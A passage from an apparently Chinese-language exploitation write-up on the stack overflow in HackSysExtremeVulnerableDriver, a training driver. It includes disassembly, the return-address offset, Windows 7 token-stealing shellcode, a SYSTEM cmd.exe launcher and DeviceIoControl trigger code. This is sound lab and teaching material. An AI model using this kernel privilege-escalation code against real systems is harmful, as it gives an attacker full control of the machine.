</span></span><span class="line"><span class="cl">  <span class="n">ms_exc</span><span class="p">.</span><span class="n">registration</span><span class="p">.</span><span class="n">TryLevel</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">ProbeForRead</span><span class="p">(</span><span class="n">UserBuffer</span><span class="p">,</span> <span class="mh">0x800u</span><span class="p">,</span> <span class="mi">1u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] UserBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelBuffer: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">KernelBuffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] KernelBuffer Size: 0x%X</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">2048</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Triggering Buffer Overflow in Stack</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">KernelBuffer</span><span class="p">,</span> <span class="n">UserBuffer</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>执行流程：DriverEntry-&gt;IrpDeviceIoCtlHandler-&gt; BufferOverflowStackIoctlHandler-&gt;TriggerBufferOverflowStack</p>
<p><code>IoControlCode</code>为0x222003时进入<code>BufferOverflowStackIoctlHandler</code></p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812220243415.png" alt="/posts/2023-8-hevd/image-20230812220243415.png" srcset="/posts/2023-8-hevd/image-20230812220243415.png?size=small, /posts/2023-8-hevd/image-20230812220243415.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812220243415.png?size=large 2x" data-title="/posts/2023-8-hevd/image-20230812220243415.png" style="--width: 899px;--aspect-ratio: 899 / 501;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444064</span> <span class="p">;</span> <span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">IrpDeviceIoCtlHandler</span><span class="p">(</span><span class="n">_DEVICE_OBJECT</span> <span class="o">*</span><span class="n">DeviceObject</span><span class="p">,</span> <span class="n">_IRP</span> <span class="o">*</span><span class="n">Irp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444064</span> <span class="n">_IrpDeviceIoCtlHandler</span><span class="err">@</span><span class="mi">8</span> <span class="n">proc</span> <span class="n">near</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="mi">87</span><span class="err">↓</span><span class="n">o</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444064</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444064</span> <span class="n">DeviceObject</span>    <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444064</span> <span class="n">Irp</span>             <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">0</span><span class="n">Ch</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444064</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444064</span>                 <span class="n">push</span>    <span class="n">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444065</span>                 <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444067</span>                 <span class="n">push</span>    <span class="n">ebx</span><span class="c1">//这里push的后面要堆栈平衡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">PAGE</span><span class="p">:</span><span class="mo">0044406</span><span class="mi">8</span>                 <span class="n">push</span>    <span class="n">esi</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">0044406</span><span class="mi">9</span>                 <span class="n">push</span>    <span class="n">edi</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">0044406</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="n">edi</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">Irp</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">0044406</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">ebx</span><span class="p">,</span> <span class="mi">0</span><span class="n">C00000BBh</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444072</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">edi</span><span class="o">+</span><span class="mi">60</span><span class="n">h</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444075</span>                 <span class="n">test</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">00444077</span>                 <span class="n">jz</span>      <span class="n">loc_4444C5</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">0044407</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">ebx</span><span class="p">,</span> <span class="n">eax</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mf">0044407F</span>                 <span class="n">mov</span>     <span class="n">ecx</span><span class="p">,</span> <span class="p">[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004440</span><span class="mi">82</span>                 <span class="n">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ecx</span><span class="o">-</span><span class="mi">222003</span><span class="n">h</span><span class="p">]</span> <span class="p">;</span> <span class="k">switch</span> <span class="mi">109</span> <span class="n">cases</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004440</span><span class="mi">88</span>                 <span class="n">cmp</span>     <span class="n">eax</span><span class="p">,</span> <span class="mi">6</span><span class="n">Ch</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004440</span><span class="mi">8</span><span class="n">B</span>                 <span class="n">ja</span>      <span class="n">def_444098</span>      <span class="p">;</span> <span class="n">jumptable</span> <span class="mo">004440</span><span class="mi">98</span> <span class="k">default</span> <span class="k">case</span><span class="p">,</span> <span class="n">cases</span> <span class="mi">2236420</span><span class="o">-</span><span class="mi">2236422</span><span class="p">,</span><span class="mi">2236424</span><span class="o">-</span><span class="mi">2236426</span><span class="p">,</span><span class="mi">2236428</span><span class="o">-</span><span class="mi">2236430</span><span class="p">,</span><span class="mi">2236432</span><span class="o">-</span><span class="mi">2236434</span><span class="p">,</span><span class="mi">2236436</span><span class="o">-</span><span class="mi">2236438</span><span class="p">,</span><span class="mi">2236440</span><span class="o">-</span><span class="mi">2236442</span><span class="p">,</span><span class="mi">2236444</span><span class="o">-</span><span class="mi">2236446</span><span class="p">,</span><span class="mi">2236448</span><span class="o">-</span><span class="mi">2236450</span><span class="p">,</span><span class="mi">2236452</span><span class="o">-</span><span class="mi">2236454</span><span class="p">,</span><span class="mi">2236456</span><span class="o">-</span><span class="mi">2236458</span><span class="p">,</span><span class="mi">2236460</span><span class="o">-</span><span class="mi">2236462</span><span class="p">,</span><span class="mi">2236464</span><span class="o">-</span><span class="mi">2236466</span><span class="p">,</span><span class="mi">2236468</span><span class="o">-</span><span class="mi">2236470</span><span class="p">,</span><span class="mi">2236472</span><span class="o">-</span><span class="mi">2236474</span><span class="p">,</span><span class="mi">2236476</span><span class="o">-</span><span class="mi">2236478</span><span class="p">,</span><span class="mi">2236480</span><span class="o">-</span><span class="mi">2236482</span><span class="p">,</span><span class="mi">2236484</span><span class="o">-</span><span class="mi">2236486</span><span class="p">,</span><span class="mi">2236488</span><span class="o">-</span><span class="mi">2236490</span><span class="p">,</span><span class="mi">2236492</span><span class="o">-</span><span class="mi">2236494</span><span class="p">,</span><span class="mi">2236496</span><span class="o">-</span><span class="mi">2236498</span><span class="p">,</span><span class="mi">2236500</span><span class="o">-</span><span class="mi">2236502</span><span class="p">,</span><span class="mi">2236504</span><span class="o">-</span><span class="mi">2236506</span><span class="p">,</span><span class="mi">2236508</span><span class="o">-</span><span class="mi">2236510</span><span class="p">,</span><span class="mi">2236512</span><span class="o">-</span><span class="mi">2236514</span><span class="p">,</span><span class="mi">2236516</span><span class="o">-</span><span class="mi">2236518</span><span class="p">,</span><span class="mi">2236520</span><span class="o">-</span><span class="mi">2236522</span><span class="p">,</span><span class="mi">2236524</span><span class="o">-</span><span class="mi">2236526</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004440</span><span class="mi">91</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="nl">ds</span><span class="p">:</span><span class="n">Index_Table</span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004440</span><span class="mi">98</span>                 <span class="n">jmp</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">Func_Table</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span> <span class="p">;</span> <span class="k">switch</span> <span class="n">jump</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004444</span><span class="n">D6</span>                 <span class="n">pop</span>     <span class="n">edi</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004444</span><span class="n">D7</span>                 <span class="n">pop</span>     <span class="n">esi</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004444</span><span class="n">D8</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004444</span><span class="n">DA</span>                 <span class="n">pop</span>     <span class="n">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004444</span><span class="n">DB</span>                 <span class="n">pop</span>     <span class="n">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">PAGE</span><span class="p">:</span><span class="mo">004444</span><span class="n">DC</span>                 <span class="n">retn</span>    <span class="mi">8</span></span></span></code></pre></div><h3 id="利用" class="heading-element">
  <a href="#%e5%88%a9%e7%94%a8" class="heading-mark"></a>利用</h3><p><code>KernelBuffer</code>到ret是<code>0x81c + 0x4 = 0x820h</code></p>
<p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812222729890.png" alt="image-20230812222729890" srcset="/posts/2023-8-hevd/image-20230812222729890.png?size=small, /posts/2023-8-hevd/image-20230812222729890.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812222729890.png?size=large 2x" data-title="image-20230812222729890" style="--width: 559px;--aspect-ratio: 559 / 182;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>首先生成shellcode空间：</p>
<div class="highlight" id="id-11"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">memset</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="sc">&#39;A&#39;</span><span class="p">,</span> <span class="mh">0x824</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mh">0x820</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="o">&amp;</span><span class="n">TokenStealingPayloadWin7</span><span class="p">;</span>  
</span></span></code></pre></div><p><code>_EPROCESS</code>结构体</p>
<div class="highlight" id="id-12"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_EPROCESS</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="n">VOID</span><span class="o">*</span> <span class="n">UniqueProcessId</span><span class="p">;</span>                                                  <span class="c1">//0xb4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">...</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">_EX_FAST_REF</span> <span class="n">Token</span><span class="p">;</span>                                              <span class="c1">//0xf8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>获取systemtoken并覆盖自己的token：</p>
<div class="highlight" id="id-13"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">VOID</span> <span class="no">TokenStealingPayloadWin7</span><span class="p">()</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// Importance of Kernel Recovery
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">__asm</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">		<span class="nf">pushad</span><span class="c1">; 保存各寄存器数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">; start of Token Stealing Stub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">		<span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span><span class="c1">; eax设置为0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="no">fs</span><span class="p">:</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">124</span><span class="no">h</span><span class="p">]</span><span class="c1">; 获取 nt!_KPCR.PcrbData.CurrentThread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">050</span><span class="no">h</span><span class="p">]</span><span class="c1">; 获取 nt!_KTHREAD.ApcState.Process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span><span class="c1">; 将本进程EPROCESS地址复制到ecx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="mi">4</span><span class="c1">; WIN 7 SP1 SYSTEM process PID = 0x4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">		<span class="nl">SearchSystemPID:</span>
</span></span><span class="line"><span class="cl">		<span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0</span><span class="no">b8h</span><span class="p">]</span><span class="c1">; 获取 nt!_EPROCESS.ActiveProcessLinks.Flink
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">sub</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span><span class="no">b8h</span>
</span></span><span class="line"><span class="cl">			<span class="nf">cmp</span><span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0</span><span class="no">b4h</span><span class="p">],</span> <span class="no">edx</span><span class="c1">; 获取 nt!_EPROCESS.UniqueProcessId
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">jne</span> <span class="no">SearchSystemPID</span><span class="c1">; 循环检测是否是SYSTEM进程PID
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">			<span class="nf">mov</span> <span class="no">edx</span><span class="p">,</span> <span class="p">[</span><span class="no">eax</span> <span class="err">+</span> <span class="mi">0</span><span class="no">f8h</span><span class="p">]</span><span class="c1">; 获取System进程的Token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">mov</span><span class="p">[</span><span class="no">ecx</span> <span class="err">+</span> <span class="mi">0</span><span class="no">f8h</span><span class="p">],</span> <span class="no">edx</span><span class="c1">; 将本进程Token替换为SYSTEM进程 nt!_EPROCESS.Token
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">; End of Token Stealing Stub
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">			<span class="nf">popad</span><span class="c1">; 恢复各个寄存器数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">			<span class="c1">; Kernel Recovery Stub//恢复堆栈平衡防止蓝屏
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span><span class="c1">; 返回状态 SUCCEESS
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">add</span> <span class="no">esp</span><span class="p">,</span> <span class="mi">12</span><span class="c1">; Fix the stack，复原前面IrpDeviceIoCtlHandler push的ebx esi edi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">pop</span> <span class="no">ebp</span><span class="c1">; Restore saved EBP
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">ret</span> <span class="mi">8</span><span class="c1">; Return cleanly
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="err">}</span>
</span></span><span class="line"><span class="cl"><span class="err">}</span></span></span></code></pre></div><p>之后调用SYSTEM token执行cmd</p>
<div class="highlight" id="id-14"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">VOID</span> <span class="nf">Cmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="n">STARTUPINFO</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">)</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESHOWWINDOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">si</span><span class="p">.</span><span class="n">wShowWindow</span> <span class="o">=</span> <span class="n">SW_SHOW</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="n">WCHAR</span> <span class="n">wzFilePath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="sa">L</span><span class="s">&#34;cmd.exe&#34;</span> <span class="p">};</span>
</span></span><span class="line"><span class="cl">	<span class="n">BOOL</span> <span class="n">bReturn</span> <span class="o">=</span> <span class="nf">CreateProcessW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">wzFilePath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPSTARTUPINFOW</span><span class="p">)</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">bReturn</span><span class="p">)</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">),</span> <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>与驱动交互：</p>
<div class="highlight" id="id-15"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="c1">//调用驱动HackSysExtremeVulnerableDriver
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">hDevice</span> <span class="o">=</span> <span class="nf">CreateFileA</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">OPEN_EXISTING</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">FILE_ATTRIBUTE_NORMAL</span> <span class="o">|</span> <span class="n">FILE_FLAG_OVERLAPPED</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span>
</span></span><span class="line"><span class="cl">    <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//向HackSysExtremeVulnerableDriver传入控制码0x222003到达TriggerBufferOverflowStack，传入0x824大小的数据
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="mh">0x222003</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mh">0x824</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bReturn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span></span></span></code></pre></div><p><img loading="lazy" src="/posts/2023-8-hevd/image-20230812231728286.png" alt="image-20230812231728286" srcset="/posts/2023-8-hevd/image-20230812231728286.png?size=small, /posts/2023-8-hevd/image-20230812231728286.png?size=medium 1.5x, /posts/2023-8-hevd/image-20230812231728286.png?size=large 2x" data-title="image-20230812231728286" style="--width: 849px;--aspect-ratio: 849 / 691;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h3 id="利用分析" class="heading-element">
  <a href="#%e5%88%a9%e7%94%a8%e5%88%86%e6%9e%90" class="heading-mark"></a>利用分析</h3><p>查看驱动服务开启后目标函数位于内存的位置：</p>
<div class="highlight" id="id-16"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">kd&gt; x HEVD!*
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">ad33561a          HEVDTriggerIntegerOverflow <span class="o">(</span>void *, unsigned long<span class="o">)</span>
</span></span><span class="line"><span class="cl">....</span></span></code></pre></div><p>跟踪<code>ad33561a</code>：</p>
<div class="highlight" id="id-17"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">u</span> <span class="no">ad3351a2</span> <span class="no">L50</span> 
</span></span><span class="line"><span class="cl"><span class="no">ad3351a2</span> <span class="mi">680</span><span class="no">c080000</span>      <span class="no">push</span>    <span class="mi">80</span><span class="no">Ch</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351a7</span> <span class="mi">68</span><span class="no">e0232fad</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span><span class="no">__safe_se_handler_table</span><span class="err">+</span><span class="mi">0x2a0</span> <span class="p">(</span><span class="no">ad2f23e0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351ac</span> <span class="no">e84fbefbff</span>      <span class="no">call</span>    <span class="no">HEVD</span><span class="p">!</span><span class="no">__SEH_prolog4</span> <span class="p">(</span><span class="no">ad2f1000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351b1</span> <span class="mi">33</span><span class="no">ff</span>            <span class="no">xor</span>     <span class="no">edi</span><span class="p">,</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351b3</span> <span class="no">bb00080000</span>      <span class="no">mov</span>     <span class="no">ebx</span><span class="p">,</span><span class="mi">800</span><span class="no">h</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351b8</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351b9</span> <span class="mi">57</span>              <span class="no">push</span>    <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351ba</span> <span class="mi">8</span><span class="no">d85e4f7ffff</span>    <span class="no">lea</span>     <span class="no">eax</span><span class="p">,[</span><span class="no">ebp-81Ch</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351c0</span> <span class="mi">50</span>              <span class="no">push</span>    <span class="no">eax</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351c1</span> <span class="no">e81cc0fbff</span>      <span class="no">call</span>    <span class="no">HEVD</span><span class="p">!</span><span class="no">memset</span> <span class="p">(</span><span class="no">ad2f11e2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351c6</span> <span class="mi">83</span><span class="no">c40c</span>          <span class="no">add</span>     <span class="no">esp</span><span class="p">,</span><span class="mi">0</span><span class="no">Ch</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351c9</span> <span class="mi">897</span><span class="no">dfc</span>          <span class="no">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-4</span><span class="p">],</span><span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351cc</span> <span class="mi">6</span><span class="no">a01</span>            <span class="no">push</span>    <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351ce</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351cf</span> <span class="no">ff7508</span>          <span class="no">push</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp</span><span class="err">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ad3351d2</span> <span class="no">ff1524202fad</span>    <span class="no">call</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">HEVD</span><span class="p">!</span><span class="no">_imp__ProbeForRead</span> <span class="p">(</span><span class="no">ad2f2024</span><span class="p">)]</span>
